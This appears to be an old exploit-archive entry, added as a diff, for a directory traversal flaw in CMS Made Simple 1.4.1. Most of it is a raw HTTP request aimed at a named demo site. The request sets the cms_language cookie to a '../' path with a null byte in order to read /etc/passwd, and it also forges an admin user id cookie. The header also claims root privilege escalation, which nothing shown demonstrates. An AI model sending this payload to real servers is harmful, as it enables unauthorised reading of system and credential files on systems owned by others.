@@ -1,0 +1,24 @@
+Type: Directory Traversal vulnerability (Unix tested) / Root privileges escalation
+Vendor: CMS Made Simple
+Software: CMS Made Simple 1.4.1 "Spring Garden" (and probably others ...)
+Author: M4ck-h@cK
+Date 29.11.2008
+Home: sweet home
+contact: no, thx :)
+
+Exploit:
+
+
+Demo: on h[ttp://demo.cmsmadesimple.fr/admin/]
+
+GET http://demo.cmsmadesimple.fr/admin/login.php HTTP/1.0
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
+Host: demo.cmsmadesimple.fr
+Cookie: cms_language=../../../../../../../../etc/passwd%00.html;cms_admin_user_id=1
+Connection: Close
+Pragma: no-cache
+
+It's possible to set "cms_language" value in order to view /etc/passwd file.
+
+# milw0rm.com [2008-11-29]
